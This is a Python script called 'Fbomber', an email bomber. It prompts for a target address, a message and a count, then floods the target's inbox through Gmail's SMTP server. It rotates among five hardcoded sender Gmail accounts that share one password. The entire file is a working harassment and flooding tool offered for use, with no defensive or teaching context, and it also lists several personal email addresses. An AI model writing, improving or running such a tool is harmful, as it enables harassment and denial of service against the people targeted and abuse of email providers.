import sys
import time
import os
import getpass
import smtplib

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

def logo():
	print('''______ _                     _               
|  ___| |                   | |              		 __            
| |_  | |__   ___  _ __ ___ | |__   ___ _ __ 		|_ |_  _ __ |_ 
|  _| | '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|		|  |_)(_)||||_)		
| |   | |_) | (_) | | | | | | |_) |  __/ |   
\_|   |_.__/ \___/|_| |_| |_|_.__/ \___|_|   		author:ToastTn
                                             
welcome to the hood                                             

''')
logo()
count=0
email_list=["stealmax580@gmail.com","instagram0instgram@gmail.com","svens4771@gmail.com","sialoampirato@gmail.com","cabellocamilla942@gmail.com"]
try:
	password = getpass.getpass(bcolors.OKGREEN + 'Unlock with your Password: ' + bcolors.ENDC)
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()

try:
	target=input("target email: ")
	subject=input("subject: ")
	body =input("message: ")
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()

def script_email_bomber(email,to,message,password):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(email,password)
	except smtplib.SMTPAuthenticationError:
		print ('''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Gmail: https://myaccount.google.com/lesssecureapps ''')
		sys.exit()
	try:
		server.sendmail(email, to, message)
		print(bcolors.WARNING + 'Successfully sent ' + str(count) + ' emails')
		time.sleep(.8)
	except KeyboardInterrupt:
		print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
		sys.exit()
	except:
		print("Failed to Send")
		server.close()
	server.quit()



try:
	x=int(input("number of emails you want to send: "))
except KeyboardInterrupt:
	print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
	sys.exit()	

z=-1
max=len(email_list)

for i in range(x):
	count=count+1
	z=z+1
	if z+1>max:
		z=0
	message = "From: " + email_list[z] + "\nSubject: " + subject + "\n" + body
	try:
		script_email_bomber(email_list[z],target,message,password)
	except KeyboardInterrupt:
		print(bcolors.FAIL + '\nCanceled' + bcolors.ENDC)
		sys.exit()
	
server = smtplib.SMTP("smtp.gmail.com", 587)
server.close()
sys.exit()


